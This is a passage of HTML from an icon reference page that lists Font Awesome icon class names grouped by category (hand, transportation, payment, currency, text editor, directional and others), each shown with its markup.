fa-hourglass"></i><br><code>.fa-hourglass</code></span><br><span><i class="fa fa-hourglass-1"></i><br><code>.fa-hourglass-1</code></span><br><span><i class="fa fa-hourglass-2"></i><br><code>.fa-hourglass-2</code></span><br><span><i class="fa fa-hourglass-3"></i><br><code>.fa-hourglass-3</code></span><br><span><i class="fa fa-hourglass-end"></i><br><code>.fa-hourglass-end</code></span><br><span><i class="fa fa-hourglass-half"></i><br><code>.fa-hourglass-half</code></span><br><span><i class="fa fa-hourglass-o"></i><br><code>.fa-hourglass-o</code></span><br><span><i class="fa fa-hourglass-start"></i><br><code>.fa-hourglass-start</code></span><br><span><i class="fa fa-i-cursor"></i><br><code>.fa-i-cursor</code></span><br><span><i class="fa fa-image"></i><br><code>.fa-image</code></span><br><span><i class="fa fa-inbox"></i><br><code>.fa-inbox</code></span><br><span><i class="fa fa-industry"></i><br><code>.fa-industry</code></span><br><span><i class="fa fa-info"></i><br><code>.fa-info</code></span><br><span><i class="fa fa-info-circle"></i><br><code>.fa-info-circle</code></span><br><span><i class="fa fa-institution"></i><br><code>.fa-institution</code></span><br><span><i class="fa fa-key"></i><br><code>.fa-key</code></span><br><span><i class="fa fa-keyboard-o"></i><br><code>.fa-keyboard-o</code></span><br><span><i class="fa fa-language"></i><br><code>.fa-language</code></span><br><span><i class="fa fa-laptop"></i><br><code>.fa-laptop</code></span><br><span><i class="fa fa-leaf"></i><br><code>.fa-leaf</code></span><br><span><i class="fa fa-legal"></i><br><code>.fa-legal</code></span><br><span><i class="fa fa-lemon-o"></i><br><code>.fa-lemon-o</code></span><br><span><i class="fa fa-level-down"></i><br><code>.fa-level-down</code></span><br><span><i class="fa fa-level-up"></i><br><code>.fa-level-up</code></span><br><span><i class="fa fa-life-bouy"></i><br><code>.fa-life-bouy</code></span><br><span><i class="fa fa-life-buoy"></i><br><code>.fa-life-buoy</code></span><br><span><i class="fa fa-life-ring"></i><br><code>.fa-life-ring</code></span><br><span><i class="fa fa-life-saver"></i><br><code>.fa-life-saver</code></span><br><span><i class="fa fa-lightbulb-o"></i><br><code>.fa-lightbulb-o</code></span><br><span><i class="fa fa-line-chart"></i><br><code>.fa-line-chart</code></span><br><span><i class="fa fa-location-arrow"></i><br><code>.fa-location-arrow</code></span><br><span><i class="fa fa-lock"></i><br><code>.fa-lock</code></span><br><span><i class="fa fa-magic"></i><br><code>.fa-magic</code></span><br><span><i class="fa fa-magnet"></i><br><code>.fa-magnet</code></span><br><span><i class="fa fa-mail-forward"></i><br><code>.fa-mail-forward</code></span><br><span><i class="fa fa-mail-reply"></i><br><code>.fa-mail-reply</code></span><br><span><i class="fa fa-mail-reply-all"></i><br><code>.fa-mail-reply-all</code></span><br><span><i class="fa fa-male"></i><br><code>.fa-male</code></span><br><span><i class="fa fa-map"></i><br><code>.fa-map</code></span><br><span><i class="fa fa-map-marker"></i><br><code>.fa-map-marker</code></span><br><span><i class="fa fa-map-o"></i><br><code>.fa-map-o</code></span><br><span><i class="fa fa-map-pin"></i><br><code>.fa-map-pin</code></span><br><span><i class="fa fa-map-signs"></i><br><code>.fa-map-signs</code></span><br><span><i class="fa fa-meh-o"></i><br><code>.fa-meh-o</code></span><br><span><i class="fa fa-microphone"></i><br><code>.fa-microphone</code></span><br><span><i class="fa fa-microphone-slash"></i><br><code>.fa-microphone-slash</code></span><br><span><i class="fa fa-minus"></i><br><code>.fa-minus</code></span><br><span><i class="fa fa-minus-circle"></i><br><code>.fa-minus-circle</code></span><br><span><i class="fa fa-minus-square"></i><br><code>.fa-minus-square</code></span><br><span><i class="fa fa-minus-square-o"></i><br><code>.fa-minus-square-o</code></span><br><span><i class="fa fa-mobile"></i><br><code>.fa-mobile</code></span><br><span><i class="fa fa-mobile-phone"></i><br><code>.fa-mobile-phone</code></span><br><span><i class="fa fa-money"></i><br><code>.fa-money</code></span><br><span><i class="fa fa-moon-o"></i><br><code>.fa-moon-o</code></span><br><span><i class="fa fa-mortar-board"></i><br><code>.fa-mortar-board</code></span><br><span><i class="fa fa-motorcycle"></i><br><code>.fa-motorcycle</code></span><br><span><i class="fa fa-mouse-pointer"></i><br><code>.fa-mouse-pointer</code></span><br><span><i class="fa fa-music"></i><br><code>.fa-music</code></span><br><span><i class="fa fa-navicon"></i><br><code>.fa-navicon</code></span><br><span><i class="fa fa-newspaper-o"></i><br><code>.fa-newspaper-o</code></span><br><span><i class="fa fa-object-group"></i><br><code>.fa-object-group</code></span><br><span><i class="fa fa-object-ungroup"></i><br><code>.fa-object-ungroup</code></span><br><span><i class="fa fa-paint-brush"></i><br><code>.fa-paint-brush</code></span><br><span><i class="fa fa-paper-plane"></i><br><code>.fa-paper-plane</code></span><br><span><i class="fa fa-paper-plane-o"></i><br><code>.fa-paper-plane-o</code></span><br><span><i class="fa fa-paw"></i><br><code>.fa-paw</code></span><br><span><i class="fa fa-pencil"></i><br><code>.fa-pencil</code></span><br><span><i class="fa fa-pencil-square"></i><br><code>.fa-pencil-square</code></span><br><span><i class="fa fa-pencil-square-o"></i><br><code>.fa-pencil-square-o</code></span><br><span><i class="fa fa-phone"></i><br><code>.fa-phone</code></span><br><span><i class="fa fa-phone-square"></i><br><code>.fa-phone-square</code></span><br><span><i class="fa fa-photo"></i><br><code>.fa-photo</code></span><br><span><i class="fa fa-picture-o"></i><br><code>.fa-picture-o</code></span><br><span><i class="fa fa-pie-chart"></i><br><code>.fa-pie-chart</code></span><br><span><i class="fa fa-plane"></i><br><code>.fa-plane</code></span><br><span><i class="fa fa-plug"></i><br><code>.fa-plug</code></span><br><span><i class="fa fa-plus"></i><br><code>.fa-plus</code></span><br><span><i class="fa fa-plus-circle"></i><br><code>.fa-plus-circle</code></span><br><span><i class="fa fa-plus-square"></i><br><code>.fa-plus-square</code></span><br><span><i class="fa fa-plus-square-o"></i><br><code>.fa-plus-square-o</code></span><br><span><i class="fa fa-power-off"></i><br><code>.fa-power-off</code></span><br><span><i class="fa fa-print"></i><br><code>.fa-print</code></span><br><span><i class="fa fa-puzzle-piece"></i><br><code>.fa-puzzle-piece</code></span><br><span><i class="fa fa-qrcode"></i><br><code>.fa-qrcode</code></span><br><span><i class="fa fa-question"></i><br><code>.fa-question</code></span><br><span><i class="fa fa-question-circle"></i><br><code>.fa-question-circle</code></span><br><span><i class="fa fa-quote-left"></i><br><code>.fa-quote-left</code></span><br><span><i class="fa fa-quote-right"></i><br><code>.fa-quote-right</code></span><br><span><i class="fa fa-random"></i><br><code>.fa-random</code></span><br><span><i class="fa fa-recycle"></i><br><code>.fa-recycle</code></span><br><span><i class="fa fa-refresh"></i><br><code>.fa-refresh</code></span><br><span><i class="fa fa-registered"></i><br><code>.fa-registered</code></span><br><span><i class="fa fa-remove"></i><br><code>.fa-remove</code></span><br><span><i class="fa fa-reorder"></i><br><code>.fa-reorder</code></span><br><span><i class="fa fa-reply"></i><br><code>.fa-reply</code></span><br><span><i class="fa fa-reply-all"></i><br><code>.fa-reply-all</code></span><br><span><i class="fa fa-retweet"></i><br><code>.fa-retweet</code></span><br><span><i class="fa fa-road"></i><br><code>.fa-road</code></span><br><span><i class="fa fa-rocket"></i><br><code>.fa-rocket</code></span><br><span><i class="fa fa-rss"></i><br><code>.fa-rss</code></span><br><span><i class="fa fa-rss-square"></i><br><code>.fa-rss-square</code></span><br><span><i class="fa fa-search"></i><br><code>.fa-search</code></span><br><span><i class="fa fa-search-minus"></i><br><code>.fa-search-minus</code></span><br><span><i class="fa fa-search-plus"></i><br><code>.fa-search-plus</code></span><br><span><i class="fa fa-send"></i><br><code>.fa-send</code></span><br><span><i class="fa fa-send-o"></i><br><code>.fa-send-o</code></span><br><span><i class="fa fa-server"></i><br><code>.fa-server</code></span><br><span><i class="fa fa-share"></i><br><code>.fa-share</code></span><br><span><i class="fa fa-share-alt"></i><br><code>.fa-share-alt</code></span><br><span><i class="fa fa-share-alt-square"></i><br><code>.fa-share-alt-square</code></span><br><span><i class="fa fa-share-square"></i><br><code>.fa-share-square</code></span><br><span><i class="fa fa-share-square-o"></i><br><code>.fa-share-square-o</code></span><br><span><i class="fa fa-shield"></i><br><code>.fa-shield</code></span><br><span><i class="fa fa-ship"></i><br><code>.fa-ship</code></span><br><span><i class="fa fa-shopping-cart"></i><br><code>.fa-shopping-cart</code></span><br><span><i class="fa fa-sign-in"></i><br><code>.fa-sign-in</code></span><br><span><i class="fa fa-sign-out"></i><br><code>.fa-sign-out</code></span><br><span><i class="fa fa-signal"></i><br><code>.fa-signal</code></span><br><span><i class="fa fa-sitemap"></i><br><code>.fa-sitemap</code></span><br><span><i class="fa fa-sliders"></i><br><code>.fa-sliders</code></span><br><span><i class="fa fa-smile-o"></i><br><code>.fa-smile-o</code></span><br><span><i class="fa fa-soccer-ball-o"></i><br><code>.fa-soccer-ball-o</code></span><br><span><i class="fa fa-sort"></i><br><code>.fa-sort</code></span><br><span><i class="fa fa-sort-alpha-asc"></i><br><code>.fa-sort-alpha-asc</code></span><br><span><i class="fa fa-sort-alpha-desc"></i><br><code>.fa-sort-alpha-desc</code></span><br><span><i class="fa fa-sort-amount-asc"></i><br><code>.fa-sort-amount-asc</code></span><br><span><i class="fa fa-sort-amount-desc"></i><br><code>.fa-sort-amount-desc</code></span><br><span><i class="fa fa-sort-asc"></i><br><code>.fa-sort-asc</code></span><br><span><i class="fa fa-sort-desc"></i><br><code>.fa-sort-desc</code></span><br><span><i class="fa fa-sort-down"></i><br><code>.fa-sort-down</code></span><br><span><i class="fa fa-sort-numeric-asc"></i><br><code>.fa-sort-numeric-asc</code></span><br><span><i class="fa fa-sort-numeric-desc"></i><br><code>.fa-sort-numeric-desc</code></span><br><span><i class="fa fa-sort-up"></i><br><code>.fa-sort-up</code></span><br><span><i class="fa fa-space-shuttle"></i><br><code>.fa-space-shuttle</code></span><br><span><i class="fa fa-spinner"></i><br><code>.fa-spinner</code></span><br><span><i class="fa fa-spoon"></i><br><code>.fa-spoon</code></span><br><span><i class="fa fa-square"></i><br><code>.fa-square</code></span><br><span><i class="fa fa-square-o"></i><br><code>.fa-square-o</code></span><br><span><i class="fa fa-star"></i><br><code>.fa-star</code></span><br><span><i class="fa fa-star-half"></i><br><code>.fa-star-half</code></span><br><span><i class="fa fa-star-half-empty"></i><br><code>.fa-star-half-empty</code></span><br><span><i class="fa fa-star-half-full"></i><br><code>.fa-star-half-full</code></span><br><span><i class="fa fa-star-half-o"></i><br><code>.fa-star-half-o</code></span><br><span><i class="fa fa-star-o"></i><br><code>.fa-star-o</code></span><br><span><i class="fa fa-sticky-note"></i><br><code>.fa-sticky-note</code></span><br><span><i class="fa fa-sticky-note-o"></i><br><code>.fa-sticky-note-o</code></span><br><span><i class="fa fa-street-view"></i><br><code>.fa-street-view</code></span><br><span><i class="fa fa-suitcase"></i><br><code>.fa-suitcase</code></span><br><span><i class="fa fa-sun-o"></i><br><code>.fa-sun-o</code></span><br><span><i class="fa fa-support"></i><br><code>.fa-support</code></span><br><span><i class="fa fa-tablet"></i><br><code>.fa-tablet</code></span><br><span><i class="fa fa-tachometer"></i><br><code>.fa-tachometer</code></span><br><span><i class="fa fa-tag"></i><br><code>.fa-tag</code></span><br><span><i class="fa fa-tags"></i><br><code>.fa-tags</code></span><br><span><i class="fa fa-tasks"></i><br><code>.fa-tasks</code></span><br><span><i class="fa fa-taxi"></i><br><code>.fa-taxi</code></span><br><span><i class="fa fa-television"></i><br><code>.fa-television</code></span><br><span><i class="fa fa-terminal"></i><br><code>.fa-terminal</code></span><br><span><i class="fa fa-thumb-tack"></i><br><code>.fa-thumb-tack</code></span><br><span><i class="fa fa-thumbs-down"></i><br><code>.fa-thumbs-down</code></span><br><span><i class="fa fa-thumbs-o-down"></i><br><code>.fa-thumbs-o-down</code></span><br><span><i class="fa fa-thumbs-o-up"></i><br><code>.fa-thumbs-o-up</code></span><br><span><i class="fa fa-thumbs-up"></i><br><code>.fa-thumbs-up</code></span><br><span><i class="fa fa-ticket"></i><br><code>.fa-ticket</code></span><br><span><i class="fa fa-times"></i><br><code>.fa-times</code></span><br><span><i class="fa fa-times-circle"></i><br><code>.fa-times-circle</code></span><br><span><i class="fa fa-times-circle-o"></i><br><code>.fa-times-circle-o</code></span><br><span><i class="fa fa-tint"></i><br><code>.fa-tint</code></span><br><span><i class="fa fa-toggle-down"></i><br><code>.fa-toggle-down</code></span><br><span><i class="fa fa-toggle-left"></i><br><code>.fa-toggle-left</code></span><br><span><i class="fa fa-toggle-off"></i><br><code>.fa-toggle-off</code></span><br><span><i class="fa fa-toggle-on"></i><br><code>.fa-toggle-on</code></span><br><span><i class="fa fa-toggle-right"></i><br><code>.fa-toggle-right</code></span><br><span><i class="fa fa-toggle-up"></i><br><code>.fa-toggle-up</code></span><br><span><i class="fa fa-trademark"></i><br><code>.fa-trademark</code></span><br><span><i class="fa fa-trash"></i><br><code>.fa-trash</code></span><br><span><i class="fa fa-trash-o"></i><br><code>.fa-trash-o</code></span><br><span><i class="fa fa-tree"></i><br><code>.fa-tree</code></span><br><span><i class="fa fa-trophy"></i><br><code>.fa-trophy</code></span><br><span><i class="fa fa-truck"></i><br><code>.fa-truck</code></span><br><span><i class="fa fa-tty"></i><br><code>.fa-tty</code></span><br><span><i class="fa fa-tv"></i><br><code>.fa-tv</code></span><br><span><i class="fa fa-umbrella"></i><br><code>.fa-umbrella</code></span><br><span><i class="fa fa-university"></i><br><code>.fa-university</code></span><br><span><i class="fa fa-unlock"></i><br><code>.fa-unlock</code></span><br><span><i class="fa fa-unlock-alt"></i><br><code>.fa-unlock-alt</code></span><br><span><i class="fa fa-unsorted"></i><br><code>.fa-unsorted</code></span><br><span><i class="fa fa-upload"></i><br><code>.fa-upload</code></span><br><span><i class="fa fa-user"></i><br><code>.fa-user</code></span><br><span><i class="fa fa-user-plus"></i><br><code>.fa-user-plus</code></span><br><span><i class="fa fa-user-secret"></i><br><code>.fa-user-secret</code></span><br><span><i class="fa fa-user-times"></i><br><code>.fa-user-times</code></span><br><span><i class="fa fa-users"></i><br><code>.fa-users</code></span><br><span><i class="fa fa-video-camera"></i><br><code>.fa-video-camera</code></span><br><span><i class="fa fa-volume-down"></i><br><code>.fa-volume-down</code></span><br><span><i class="fa fa-volume-off"></i><br><code>.fa-volume-off</code></span><br><span><i class="fa fa-volume-up"></i><br><code>.fa-volume-up</code></span><br><span><i class="fa fa-warning"></i><br><code>.fa-warning</code></span><br><span><i class="fa fa-wheelchair"></i><br><code>.fa-wheelchair</code></span><br><span><i class="fa fa-wifi"></i><br><code>.fa-wifi</code></span><br><span><i class="fa fa-wrench"></i><br><code>.fa-wrench</code></span></div><h2 id="Hand-Icons"><a href="#Hand-Icons" class="headerlink" title="Hand Icons"></a>Hand Icons</h2><div class="fa-icons"><span><i class="fa fa-hand-grab-o"></i><br><code>.fa-hand-grab-o</code></span><br><span><i class="fa fa-hand-lizard-o"></i><br><code>.fa-hand-lizard-o</code></span><br><span><i class="fa fa-hand-o-down"></i><br><code>.fa-hand-o-down</code></span><br><span><i class="fa fa-hand-o-left"></i><br><code>.fa-hand-o-left</code></span><br><span><i class="fa fa-hand-o-right"></i><br><code>.fa-hand-o-right</code></span><br><span><i class="fa fa-hand-o-up"></i><br><code>.fa-hand-o-up</code></span><br><span><i class="fa fa-hand-paper-o"></i><br><code>.fa-hand-paper-o</code></span><br><span><i class="fa fa-hand-peace-o"></i><br><code>.fa-hand-peace-o</code></span><br><span><i class="fa fa-hand-pointer-o"></i><br><code>.fa-hand-pointer-o</code></span><br><span><i class="fa fa-hand-rock-o"></i><br><code>.fa-hand-rock-o</code></span><br><span><i class="fa fa-hand-scissors-o"></i><br><code>.fa-hand-scissors-o</code></span><br><span><i class="fa fa-hand-spock-o"></i><br><code>.fa-hand-spock-o</code></span><br><span><i class="fa fa-hand-stop-o"></i><br><code>.fa-hand-stop-o</code></span><br><span><i class="fa fa-thumbs-down"></i><br><code>.fa-thumbs-down</code></span><br><span><i class="fa fa-thumbs-o-down"></i><br><code>.fa-thumbs-o-down</code></span><br><span><i class="fa fa-thumbs-o-up"></i><br><code>.fa-thumbs-o-up</code></span><br><span><i class="fa fa-thumbs-up"></i><br><code>.fa-thumbs-up</code></span></div><h2 id="Transportation-Icons"><a href="#Transportation-Icons" class="headerlink" title="Transportation Icons"></a>Transportation Icons</h2><div class="fa-icons"><span><i class="fa fa-ambulance"></i><br><code>.fa-ambulance</code></span><br><span><i class="fa fa-automobile"></i><br><code>.fa-automobile</code></span><br><span><i class="fa fa-bicycle"></i><br><code>.fa-bicycle</code></span><br><span><i class="fa fa-bus"></i><br><code>.fa-bus</code></span><br><span><i class="fa fa-cab"></i><br><code>.fa-cab</code></span><br><span><i class="fa fa-car"></i><br><code>.fa-car</code></span><br><span><i class="fa fa-fighter-jet"></i><br><code>.fa-fighter-jet</code></span><br><span><i class="fa fa-motorcycle"></i><br><code>.fa-motorcycle</code></span><br><span><i class="fa fa-plane"></i><br><code>.fa-plane</code></span><br><span><i class="fa fa-rocket"></i><br><code>.fa-rocket</code></span><br><span><i class="fa fa-ship"></i><br><code>.fa-ship</code></span><br><span><i class="fa fa-space-shuttle"></i><br><code>.fa-space-shuttle</code></span><br><span><i class="fa fa-subway"></i><br><code>.fa-subway</code></span><br><span><i class="fa fa-taxi"></i><br><code>.fa-taxi</code></span><br><span><i class="fa fa-train"></i><br><code>.fa-train</code></span><br><span><i class="fa fa-truck"></i><br><code>.fa-truck</code></span><br><span><i class="fa fa-wheelchair"></i><br><code>.fa-wheelchair</code></span></div><h2 id="Gender-Icons"><a href="#Gender-Icons" class="headerlink" title="Gender Icons"></a>Gender Icons</h2><div class="fa-icons"><span><i class="fa fa-genderless"></i><br><code>.fa-genderless</code></span><br><span><i class="fa fa-intersex"></i><br><code>.fa-intersex</code></span><br><span><i class="fa fa-mars"></i><br><code>.fa-mars</code></span><br><span><i class="fa fa-mars-double"></i><br><code>.fa-mars-double</code></span><br><span><i class="fa fa-mars-stroke"></i><br><code>.fa-mars-stroke</code></span><br><span><i class="fa fa-mars-stroke-h"></i><br><code>.fa-mars-stroke-h</code></span><br><span><i class="fa fa-mars-stroke-v"></i><br><code>.fa-mars-stroke-v</code></span><br><span><i class="fa fa-mercury"></i><br><code>.fa-mercury</code></span><br><span><i class="fa fa-neuter"></i><br><code>.fa-neuter</code></span><br><span><i class="fa fa-transgender"></i><br><code>.fa-transgender</code></span><br><span><i class="fa fa-transgender-alt"></i><br><code>.fa-transgender-alt</code></span><br><span><i class="fa fa-venus"></i><br><code>.fa-venus</code></span><br><span><i class="fa fa-venus-double"></i><br><code>.fa-venus-double</code></span><br><span><i class="fa fa-venus-mars"></i><br><code>.fa-venus-mars</code></span></div><h2 id="File-Type-Icons"><a href="#File-Type-Icons" class="headerlink" title="File Type Icons"></a>File Type Icons</h2><div class="fa-icons"><span><i class="fa fa-file"></i><br><code>.fa-file</code></span><br><span><i class="fa fa-file-archive-o"></i><br><code>.fa-file-archive-o</code></span><br><span><i class="fa fa-file-audio-o"></i><br><code>.fa-file-audio-o</code></span><br><span><i class="fa fa-file-code-o"></i><br><code>.fa-file-code-o</code></span><br><span><i class="fa fa-file-excel-o"></i><br><code>.fa-file-excel-o</code></span><br><span><i class="fa fa-file-image-o"></i><br><code>.fa-file-image-o</code></span><br><span><i class="fa fa-file-movie-o"></i><br><code>.fa-file-movie-o</code></span><br><span><i class="fa fa-file-o"></i><br><code>.fa-file-o</code></span><br><span><i class="fa fa-file-pdf-o"></i><br><code>.fa-file-pdf-o</code></span><br><span><i class="fa fa-file-photo-o"></i><br><code>.fa-file-photo-o</code></span><br><span><i class="fa fa-file-picture-o"></i><br><code>.fa-file-picture-o</code></span><br><span><i class="fa fa-file-powerpoint-o"></i><br><code>.fa-file-powerpoint-o</code></span><br><span><i class="fa fa-file-sound-o"></i><br><code>.fa-file-sound-o</code></span><br><span><i class="fa fa-file-text"></i><br><code>.fa-file-text</code></span><br><span><i class="fa fa-file-text-o"></i><br><code>.fa-file-text-o</code></span><br><span><i class="fa fa-file-video-o"></i><br><code>.fa-file-video-o</code></span><br><span><i class="fa fa-file-word-o"></i><br><code>.fa-file-word-o</code></span><br><span><i class="fa fa-file-zip-o"></i><br><code>.fa-file-zip-o</code></span></div><h2 id="Spinner-Icons"><a href="#Spinner-Icons" class="headerlink" title="Spinner Icons"></a>Spinner Icons</h2><div class="fa-icons"><span><i class="fa fa-circle-o-notch"></i><br><code>.fa-circle-o-notch</code></span><br><span><i class="fa fa-cog"></i><br><code>.fa-cog</code></span><br><span><i class="fa fa-gear"></i><br><code>.fa-gear</code></span><br><span><i class="fa fa-refresh"></i><br><code>.fa-refresh</code></span><br><span><i class="fa fa-spinner"></i><br><code>.fa-spinner</code></span></div><h2 id="Form-Control-Icons"><a href="#Form-Control-Icons" class="headerlink" title="Form Control Icons"></a>Form Control Icons</h2><div class="fa-icons"><span><i class="fa fa-check-square"></i><br><code>.fa-check-square</code></span><br><span><i class="fa fa-check-square-o"></i><br><code>.fa-check-square-o</code></span><br><span><i class="fa fa-circle"></i><br><code>.fa-circle</code></span><br><span><i class="fa fa-circle-o"></i><br><code>.fa-circle-o</code></span><br><span><i class="fa fa-dot-circle-o"></i><br><code>.fa-dot-circle-o</code></span><br><span><i class="fa fa-minus-square"></i><br><code>.fa-minus-square</code></span><br><span><i class="fa fa-minus-square-o"></i><br><code>.fa-minus-square-o</code></span><br><span><i class="fa fa-plus-square"></i><br><code>.fa-plus-square</code></span><br><span><i class="fa fa-plus-square-o"></i><br><code>.fa-plus-square-o</code></span><br><span><i class="fa fa-square"></i><br><code>.fa-square</code></span><br><span><i class="fa fa-square-o"></i><br><code>.fa-square-o</code></span></div><h2 id="Payment-Icons"><a href="#Payment-Icons" class="headerlink" title="Payment Icons"></a>Payment Icons</h2><div class="fa-icons"><span><i class="fa fa-cc-amex"></i><br><code>.fa-cc-amex</code></span><br><span><i class="fa fa-cc-diners-club"></i><br><code>.fa-cc-diners-club</code></span><br><span><i class="fa fa-cc-discover"></i><br><code>.fa-cc-discover</code></span><br><span><i class="fa fa-cc-jcb"></i><br><code>.fa-cc-jcb</code></span><br><span><i class="fa fa-cc-mastercard"></i><br><code>.fa-cc-mastercard</code></span><br><span><i class="fa fa-cc-paypal"></i><br><code>.fa-cc-paypal</code></span><br><span><i class="fa fa-cc-stripe"></i><br><code>.fa-cc-stripe</code></span><br><span><i class="fa fa-cc-visa"></i><br><code>.fa-cc-visa</code></span><br><span><i class="fa fa-credit-card"></i><br><code>.fa-credit-card</code></span><br><span><i class="fa fa-google-wallet"></i><br><code>.fa-google-wallet</code></span><br><span><i class="fa fa-paypal"></i><br><code>.fa-paypal</code></span></div><h2 id="Chart-Icons"><a href="#Chart-Icons" class="headerlink" title="Chart Icons"></a>Chart Icons</h2><div class="fa-icons"><span><i class="fa fa-area-chart"></i><br><code>.fa-area-chart</code></span><br><span><i class="fa fa-bar-chart"></i><br><code>.fa-bar-chart</code></span><br><span><i class="fa fa-bar-chart-o"></i><br><code>.fa-bar-chart-o</code></span><br><span><i class="fa fa-line-chart"></i><br><code>.fa-line-chart</code></span><br><span><i class="fa fa-pie-chart"></i><br><code>.fa-pie-chart</code></span></div><h2 id="Currency-Icons"><a href="#Currency-Icons" class="headerlink" title="Currency Icons"></a>Currency Icons</h2><div class="fa-icons"><span><i class="fa fa-bitcoin"></i><br><code>.fa-bitcoin</code></span><br><span><i class="fa fa-btc"></i><br><code>.fa-btc</code></span><br><span><i class="fa fa-cny"></i><br><code>.fa-cny</code></span><br><span><i class="fa fa-dollar"></i><br><code>.fa-dollar</code></span><br><span><i class="fa fa-eur"></i><br><code>.fa-eur</code></span><br><span><i class="fa fa-euro"></i><br><code>.fa-euro</code></span><br><span><i class="fa fa-gbp"></i><br><code>.fa-gbp</code></span><br><span><i class="fa fa-gg"></i><br><code>.fa-gg</code></span><br><span><i class="fa fa-gg-circle"></i><br><code>.fa-gg-circle</code></span><br><span><i class="fa fa-ils"></i><br><code>.fa-ils</code></span><br><span><i class="fa fa-inr"></i><br><code>.fa-inr</code></span><br><span><i class="fa fa-jpy"></i><br><code>.fa-jpy</code></span><br><span><i class="fa fa-krw"></i><br><code>.fa-krw</code></span><br><span><i class="fa fa-money"></i><br><code>.fa-money</code></span><br><span><i class="fa fa-rmb"></i><br><code>.fa-rmb</code></span><br><span><i class="fa fa-rouble"></i><br><code>.fa-rouble</code></span><br><span><i class="fa fa-rub"></i><br><code>.fa-rub</code></span><br><span><i class="fa fa-ruble"></i><br><code>.fa-ruble</code></span><br><span><i class="fa fa-rupee"></i><br><code>.fa-rupee</code></span><br><span><i class="fa fa-shekel"></i><br><code>.fa-shekel</code></span><br><span><i class="fa fa-sheqel"></i><br><code>.fa-sheqel</code></span><br><span><i class="fa fa-try"></i><br><code>.fa-try</code></span><br><span><i class="fa fa-turkish-lira"></i><br><code>.fa-turkish-lira</code></span><br><span><i class="fa fa-usd"></i><br><code>.fa-usd</code></span><br><span><i class="fa fa-won"></i><br><code>.fa-won</code></span><br><span><i class="fa fa-yen"></i><br><code>.fa-yen</code></span></div><h2 id="Text-Editor-Icons"><a href="#Text-Editor-Icons" class="headerlink" title="Text Editor Icons"></a>Text Editor Icons</h2><div class="fa-icons"><span><i class="fa fa-align-center"></i><br><code>.fa-align-center</code></span><br><span><i class="fa fa-align-justify"></i><br><code>.fa-align-justify</code></span><br><span><i class="fa fa-align-left"></i><br><code>.fa-align-left</code></span><br><span><i class="fa fa-align-right"></i><br><code>.fa-align-right</code></span><br><span><i class="fa fa-bold"></i><br><code>.fa-bold</code></span><br><span><i class="fa fa-chain"></i><br><code>.fa-chain</code></span><br><span><i class="fa fa-chain-broken"></i><br><code>.fa-chain-broken</code></span><br><span><i class="fa fa-clipboard"></i><br><code>.fa-clipboard</code></span><br><span><i class="fa fa-columns"></i><br><code>.fa-columns</code></span><br><span><i class="fa fa-copy"></i><br><code>.fa-copy</code></span><br><span><i class="fa fa-cut"></i><br><code>.fa-cut</code></span><br><span><i class="fa fa-dedent"></i><br><code>.fa-dedent</code></span><br><span><i class="fa fa-eraser"></i><br><code>.fa-eraser</code></span><br><span><i class="fa fa-file"></i><br><code>.fa-file</code></span><br><span><i class="fa fa-file-o"></i><br><code>.fa-file-o</code></span><br><span><i class="fa fa-file-text"></i><br><code>.fa-file-text</code></span><br><span><i class="fa fa-file-text-o"></i><br><code>.fa-file-text-o</code></span><br><span><i class="fa fa-files-o"></i><br><code>.fa-files-o</code></span><br><span><i class="fa fa-floppy-o"></i><br><code>.fa-floppy-o</code></span><br><span><i class="fa fa-font"></i><br><code>.fa-font</code></span><br><span><i class="fa fa-header"></i><br><code>.fa-header</code></span><br><span><i class="fa fa-indent"></i><br><code>.fa-indent</code></span><br><span><i class="fa fa-italic"></i><br><code>.fa-italic</code></span><br><span><i class="fa fa-link"></i><br><code>.fa-link</code></span><br><span><i class="fa fa-list"></i><br><code>.fa-list</code></span><br><span><i class="fa fa-list-alt"></i><br><code>.fa-list-alt</code></span><br><span><i class="fa fa-list-ol"></i><br><code>.fa-list-ol</code></span><br><span><i class="fa fa-list-ul"></i><br><code>.fa-list-ul</code></span><br><span><i class="fa fa-outdent"></i><br><code>.fa-outdent</code></span><br><span><i class="fa fa-paperclip"></i><br><code>.fa-paperclip</code></span><br><span><i class="fa fa-paragraph"></i><br><code>.fa-paragraph</code></span><br><span><i class="fa fa-paste"></i><br><code>.fa-paste</code></span><br><span><i class="fa fa-repeat"></i><br><code>.fa-repeat</code></span><br><span><i class="fa fa-rotate-left"></i><br><code>.fa-rotate-left</code></span><br><span><i class="fa fa-rotate-right"></i><br><code>.fa-rotate-right</code></span><br><span><i class="fa fa-save"></i><br><code>.fa-save</code></span><br><span><i class="fa fa-scissors"></i><br><code>.fa-scissors</code></span><br><span><i class="fa fa-strikethrough"></i><br><code>.fa-strikethrough</code></span><br><span><i class="fa fa-subscript"></i><br><code>.fa-subscript</code></span><br><span><i class="fa fa-superscript"></i><br><code>.fa-superscript</code></span><br><span><i class="fa fa-table"></i><br><code>.fa-table</code></span><br><span><i class="fa fa-text-height"></i><br><code>.fa-text-height</code></span><br><span><i class="fa fa-text-width"></i><br><code>.fa-text-width</code></span><br><span><i class="fa fa-th"></i><br><code>.fa-th</code></span><br><span><i class="fa fa-th-large"></i><br><code>.fa-th-large</code></span><br><span><i class="fa fa-th-list"></i><br><code>.fa-th-list</code></span><br><span><i class="fa fa-underline"></i><br><code>.fa-underline</code></span><br><span><i class="fa fa-undo"></i><br><code>.fa-undo</code></span><br><span><i class="fa fa-unlink"></i><br><code>.fa-unlink</code></span></div><h2 id="Directional-Icons"><a href="#Directional-Icons" class="headerlink" title="Directional Icons"></a>Directional Icons</h2><div class="fa-icons"><span><i class="fa fa-angle-double-down"></i><br><code>.fa-angle-double-down</code></span><br><span><i class="fa fa-angle-double-left"></i><br><code>.fa-angle-double-left</code></span><br><span><i class="fa fa-angle-double-right"></i><br><code>.fa-angle-double-right</code></span><br><span><i class="fa fa-angle-double-up"></i><br><code>.fa-angle-double-up</code></span><br><span><i class="fa fa-angle-down"></i><br><code>.fa-angle-down</code></span><br><span><i class="fa fa-angle-left"></i><br><code>.fa-angle-left</code></span><br><span><i class="fa fa-angle-right"></i><br><code>.fa-angle-right</code></span><br><span><i class="fa fa-angle-up"></i><br><code>.fa-angle-up</code></span><br><span><i class="fa fa-arrow-circle-down"></i><br><code>.fa-arrow-circle-down</code></span><br><span><i class="fa fa-arrow-circle-left"></i><br><code>.fa-arrow-circle-left</code></span><br><span><i class="fa fa-arrow-circle-o-down"></i><br><code>.fa-arrow-circle-o-down</code></span><br><span><i class="fa fa-arrow-circle-o-left"></i><br><code>.fa-arrow-circle-o-left</code></span><br><span><i class="fa 